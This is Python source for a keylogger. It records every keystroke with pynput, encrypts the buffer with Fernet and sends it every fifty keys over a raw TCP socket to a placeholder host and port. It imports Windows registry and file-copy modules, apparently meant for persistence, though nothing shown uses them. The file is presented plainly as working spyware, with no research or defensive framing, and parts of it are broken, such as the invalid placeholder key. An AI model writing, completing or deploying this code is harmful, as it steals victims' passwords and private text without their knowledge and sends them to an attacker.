import socket
import struct
import os
import sys
import shutil
import winreg
from pynput import keyboard
from cryptography.fernet import Fernet

def encrypt(data): return fernet.encrypt(data)

def send_data(conn, data: bytes):
    enc = encrypt(data)
    try:
        conn.send(struct.pack('>I', len(enc)))
        conn.send(enc)
    except:pass
KEY = 'RANDOM_KEY'
fernet = Fernet(KEY)

HOST="__ipaddr__"
PORT=12345

payloads = []
counter = 0
keys = 50

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def control(conn, key):
    global counter
    counter += 1
    text = ""
    if key == keyboard.Key.enter:
        text = f"\n"
    elif key == keyboard.Key.backspace:
        payloads.remove(payloads[len(payloads)-1])
    elif key == keyboard.Key.space:
        payloads.append(" ")
    else:
        text = str(key).strip("'")
        payloads.append(text)
    if counter >= 50:
        counter = 0
        send(conn)
        
def send(conn):
    key_text = "".join(payloads)
    send_data(conn, key_text.encode())

def pressKey(key):
    try:s.connect((HOST, PORT))
    except:pass
    control(s, key)

with keyboard.Listener(on_press=pressKey) as listener:
    listener.join()